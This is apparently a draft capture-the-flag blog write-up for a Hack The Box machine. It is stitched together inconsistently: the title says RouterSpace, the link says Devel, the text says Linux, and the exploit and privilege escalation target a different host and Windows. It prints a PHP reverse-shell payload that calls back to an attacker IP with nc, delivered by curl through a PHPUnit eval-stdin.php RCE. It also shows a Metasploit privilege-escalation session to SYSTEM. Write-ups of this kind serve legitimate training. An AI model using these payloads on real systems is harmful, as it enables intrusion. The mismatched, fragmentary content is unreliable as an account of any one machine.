---
layout: post
title: Hack The Box - RouterSpace
categories:
  - hackthebox
slug: htb-routerpsace
tags:
  - windows
---
## Challenge description

[https://app.hackthebox.com/machines/Devel](https://app.hackthebox.com/machines/RouterSpace)

This VM is a medium Linux machine

## Reconnaissance / Enumeration

### Port scanning and service identification

```
$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC
[...]


```

### Web Enumeration

Exposed vendor folder

search each modules for exploit

php unit, rce

rcepoc.png

## Exploitation && Foothold

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'); ?>

curl -X POST http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'); ?>"

Foothold as www-data

## Lateral Movement

Must move to steven

## Privilege Escalation

There are 2 services vulnerable to a registry edit attack. Dnscache and RpcEptMapper. There is a way to create a performance counter pointing to a malicious DLL.

The exploit is well described [here](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

There's a metasploit module that we can use to exploit the service: exploit/windows/local/service_permissions

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/service_permissions
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > set session 1
session => 1
msf6 exploit(windows/local/service_permissions) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/service_permissions) > run

[*] Started reverse TCP handler on 1.1.1.1:4444
[*] Trying to add a new service...
[*] Trying to find weak permissions in existing services..
[+] [Dnscache] Created registry key: HKLM\System\CurrentControlSet\Services\Dnscache\Performance
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (1.1.1.1:4444 -> 10.10.10.5:49271 ) at 2022-01-19 02:02:05 +0000

meterpreter > shell
Process 728 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
e69af0e4f443de7e36876fda4ec7644f
C:\Windows\system32>whoami
whoami
nt authority\system

c:\Users\babis\Desktop>more user.txt.txt
more user.txt.txt
(redacted)

C:\Windows\system32>more e69af0e4f443de7e36876fda4ec7644fc:\users\administrator\desktop\root.txt
more c:\users\administrator\desktop\root.txt
(redacted)
```

Thanks for reading <3

h3x
